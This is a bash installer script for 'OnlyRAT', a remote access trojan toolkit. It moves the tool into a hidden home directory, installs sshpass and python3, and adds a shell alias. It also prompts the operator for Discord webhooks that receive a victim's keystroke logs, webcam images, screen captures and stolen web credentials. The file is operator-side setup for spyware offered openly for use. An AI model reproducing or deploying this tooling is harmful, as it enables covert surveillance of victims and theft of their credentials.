#!/bin/bash
# installer for OnlyRAT
# created by : C0SM0

# staging
echo [*] Staging process...
mkdir ~/.OnlyRAT
cd ..
mv OnlyRAT/* ~/.OnlyRAT
rm -rf OnlyRAT
cd ~/.OnlyRAT
echo [+] Completed

#  get tools
echo [*] Installing tools...
sudo apt update
sudo apt-get install sshpass
sudo apt-get install python3
echo [+] Completed

# set up alias workflow
echo [*] Setting up alias...
echo "alias onlyrat=\"python3 $(pwd)/main.py\"" >> ~/.bashrc
echo [+] Completed

# get discord webhooks
echo "Enter discord webhook for..."
# keylogs
echo "Key Logs : "
read keylogs
# webcam
echo "Images : "
read webcam
# screencapture
echo "Screen Captures : "
read screen
# web credentials
echo "Web Cred : "
read webcreds

# write webhooks to file
echo $keylogs > webhooks.log
echo $webcam >> webhooks.log
echo $screen >> webhooks.log
echo $webcreds >> webhooks.log

# clean up
echo [+] Installation Completed
echo "- please restart your terminal"
echo "- type 'onlyrat' launch OnlyRat"
